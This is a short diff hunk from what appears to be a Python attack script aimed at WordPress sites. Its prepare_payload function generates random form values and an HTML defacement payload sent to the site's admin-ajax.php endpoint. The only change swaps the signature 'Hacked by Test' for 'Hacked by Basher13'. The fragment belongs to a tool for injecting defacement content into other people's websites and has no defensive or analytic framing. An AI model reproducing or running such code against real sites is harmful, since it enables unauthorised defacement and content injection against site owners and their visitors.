@@ -44,7 +44,7 @@ def prepare_payload(domain, form, form_id):
         first_name = generate_random_string()
         last_name = generate_random_string()
         email_prefix = generate_random_string()
-        payload = '<h1 style="color:red;">Hacked by Test</h1>'
+        payload = '<h1 style="color:red;">Hacked by Basher13</h1>'
 
         urls = {
             "url1": f'https://{domain}/wp-admin/admin-ajax.php',
